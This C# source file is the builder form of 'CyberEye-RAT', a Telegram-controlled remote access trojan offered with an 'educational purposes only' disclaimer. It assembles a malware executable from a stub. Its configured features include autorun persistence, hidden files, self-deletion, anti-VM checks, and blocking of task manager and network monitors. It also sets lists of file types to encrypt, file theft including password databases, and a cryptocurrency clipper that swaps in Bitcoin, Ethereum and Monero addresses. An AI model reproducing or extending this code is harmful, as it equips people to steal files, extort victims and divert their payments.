/* 
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/


using System;
using System.Data;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace CyberEye.Client.Builder
{
    public partial class frmBuild : Form
    {
        public static string AssemblyTitle = "TelegramRAT (CyberEye) Modded";
        public static string AssemblyDescription = "";
        public static string AssemblyConfiguration = "";
        public static string AssemblyCompany = "";
        public static string AssemblyProduct = "TelegramRAT (CyberEye) Modded";
        public static string AssemblyCopyright = "Copyright © 2023";
        public static string AssemblyTrademark = "";
        public static string AssemblyCulture = "";
        public static string AssemblyVersion = "1.0.2";
        public static string AssemblyFileVersion = "1.0.2";
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk",
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        public frmBuild()
        {
            InitializeComponent();
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
        private void RefreshListBox()
        {
            listBox1.DataSource = null;
            listBox1.DataSource = EncryptionFileTypes;
        }
        private void RefreshGrabListBox()
        {
            listBox2.DataSource = null;
            listBox2.DataSource = GrabFileTypes;
        }
        private void RefreshProcessListBox()
        {
            listBox3.DataSource = null;
            listBox3.DataSource = BlockNetworkActivityProcessList;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string newItem = textBox5.Text.Trim();
            if (!string.IsNullOrEmpty(newItem) && !EncryptionFileTypes.Contains(newItem))
            {
                var tempList = new string[EncryptionFileTypes.Length + 1];
                EncryptionFileTypes.CopyTo(tempList, 0);
                tempList[tempList.Length - 1] = newItem;
                EncryptionFileTypes = tempList;

                RefreshListBox();
                textBox5.Clear();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string selected = listBox1.SelectedItem as string;
            if (selected != null)
            {
                EncryptionFileTypes = EncryptionFileTypes.Where(x => x != selected).ToArray();
                RefreshListBox();
            }
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            RefreshListBox();
            RefreshGrabListBox();
            RefreshProcessListBox();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string newItem = textBox6.Text.Trim();
            if (!string.IsNullOrEmpty(newItem) && !GrabFileTypes.Contains(newItem))
            {
                var tempList = new string[GrabFileTypes.Length + 1];
                GrabFileTypes.CopyTo(tempList, 0);
                tempList[tempList.Length - 1] = newItem;
                GrabFileTypes = tempList;

                RefreshGrabListBox();
                textBox6.Clear();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            string selected = listBox2.SelectedItem as string;
            if (selected != null)
            {
                GrabFileTypes = GrabFileTypes.Where(x => x != selected).ToArray();
                RefreshGrabListBox();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            string newItem = textBox7.Text.Trim();
            if (!string.IsNullOrEmpty(newItem) && !BlockNetworkActivityProcessList.Contains(newItem, StringComparer.OrdinalIgnoreCase))
            {
                var tempList = new string[BlockNetworkActivityProcessList.Length + 1];
                BlockNetworkActivityProcessList.CopyTo(tempList, 0);
                tempList[tempList.Length - 1] = newItem;
                BlockNetworkActivityProcessList = tempList;

                RefreshProcessListBox();
                textBox7.Clear();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            string selected = listBox3.SelectedItem as string;
            if (selected != null)
            {
                BlockNetworkActivityProcessList = BlockNetworkActivityProcessList
                    .Where(x => !string.Equals(x, selected, StringComparison.OrdinalIgnoreCase))
                    .ToArray();

                RefreshProcessListBox();
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            FrmAbout about = new FrmAbout();
            about.ShowDialog();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            FrmAssemblyChanger asmchange = new FrmAssemblyChanger();
            asmchange.ShowDialog();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = "EXE|*.exe",
                FileName = "CyberEye.exe"
            };

            if (dialog.ShowDialog() == DialogResult.OK)
            {
                string savePath = dialog.FileName;

                if (File.Exists(savePath))
                {
                    File.Delete(savePath);
                }

                string stubPath = Path.Combine(Application.StartupPath, "Stub", "Stub.il");

                if (!File.Exists(stubPath))
                {
                    MessageBox.Show("Stub.il not found!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string ilCode = File.ReadAllText(stubPath);

                // Replace placeholders
                ilCode = ilCode.Replace("[TELEGRAMTOKEN]", textBox1.Text);
                ilCode = ilCode.Replace("[TELEGRAMCHATID]", textBox2.Text);
                ilCode = ilCode.Replace("[TELEGRAMCOMMANDCHECKDELAY]", numericUpDown1.Value.ToString());
                ilCode = ilCode.Replace("[AdminRightsRequired]", checkBox1.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[AtrHidEnabled]", checkBox2.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[AtrSysEnabled]", checkBox3.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[MeltFile]", checkBox4.Checked.ToString().ToLower());

                ilCode = ilCode.Replace("[InstallPathBuild]", textBox3.Text);
                ilCode = ilCode.Replace("[AUTORUNENABLED]", checkBox5.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[AUTORUNNAME]", textBox4.Text);
                ilCode = ilCode.Replace("[BSODPROTECT]", checkBox6.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[HideConsoleWindow]", checkBox7.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[PreventVRMachineStart]", checkBox8.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[STARTDELAYBUILD]", numericUpDown2.Value.ToString());

                ilCode = ilCode.Replace("[BlockNetworkAct]", checkBox9.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[GrabFileSizeBuild]", numericUpDown3.Value.ToString());
                ilCode = ilCode.Replace("[AUTOSTEAL]", checkBox10.Checked.ToString().ToLower());
                ilCode = ilCode.Replace("[CLIPPERENABLED]", checkBox11.Checked.ToString().ToLower());

                ilCode = ilCode.Replace("[BITCOINADRESS]", textBox8.Text);
                ilCode = ilCode.Replace("[ETHERIUMADRESS]", textBox9.Text);
                ilCode = ilCode.Replace("[MONEROADRESS]", textBox10.Text);

                ilCode = ilCode.Replace("[AssemblyTitleBuild]", AssemblyTitle);
                ilCode = ilCode.Replace("[AssemblyDescriptionBuild]", AssemblyDescription);
                ilCode = ilCode.Replace("[AssemblyConfigurationBuild]", AssemblyConfiguration);
                ilCode = ilCode.Replace("[AssemblyCompanyBuild]", AssemblyCompany);
                ilCode = ilCode.Replace("[AssemblyProductBuild]", AssemblyProduct);
                ilCode = ilCode.Replace("[AssemblyCopyrightBuild]", AssemblyCopyright);
                ilCode = ilCode.Replace("[AssemblyTrademarkBuild]", AssemblyTrademark);
                ilCode = ilCode.Replace("[AssemblyCultureBuild]", AssemblyCulture);
                ilCode = ilCode.Replace("1.0.2", AssemblyVersion);
                ilCode = ilCode.Replace("[AssemblyFileVersionBuild]", AssemblyFileVersion);
                // Save modified IL
                string tempIl = Path.GetTempFileName();
                File.WriteAllText(tempIl, ilCode);

                // Path to ilasm (you may need to adjust this based on .NET version and system arch)
                string ilasmPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), @"Microsoft.NET\Framework\v4.0.30319\ilasm.exe");

                if (!File.Exists(ilasmPath))
                {
                    MessageBox.Show("ilasm.exe not found. Ensure .NET Framework is installed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                /*
                // 📌 Resource Path
                string resourcePath = Path.Combine(Application.StartupPath, "Stub", "TelegramRAT.Properties.Resources.resources");

                if (!File.Exists(resourcePath))
                {
                    MessageBox.Show("Resources TelegramRAT.Properties.Resources.resources not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                */
                // Compile using ilasm
                System.Diagnostics.Process ilasm = new System.Diagnostics.Process();
                ilasm.StartInfo.FileName = ilasmPath;

                //ilasm.StartInfo.Arguments = $"\"{tempIl}\" /output:\"{savePath}\" /exe /res:\"{resourcePath}\"";
                ilasm.StartInfo.Arguments = $"\"{tempIl}\" /output:\"{savePath}\" /exe";

                ilasm.StartInfo.CreateNoWindow = true;
                ilasm.StartInfo.UseShellExecute = false;
                ilasm.StartInfo.RedirectStandardOutput = true;
                ilasm.StartInfo.RedirectStandardError = true;

                ilasm.Start();
                string output = ilasm.StandardOutput.ReadToEnd();
                string error = ilasm.StandardError.ReadToEnd();
                ilasm.WaitForExit();

                File.Delete(tempIl);

                if (ilasm.ExitCode != 0 || !File.Exists(savePath))
                {
                    MessageBox.Show($"An error occurred during build:\n{error}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                MessageBox.Show("Build completed successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);

            }
        }
    }
}
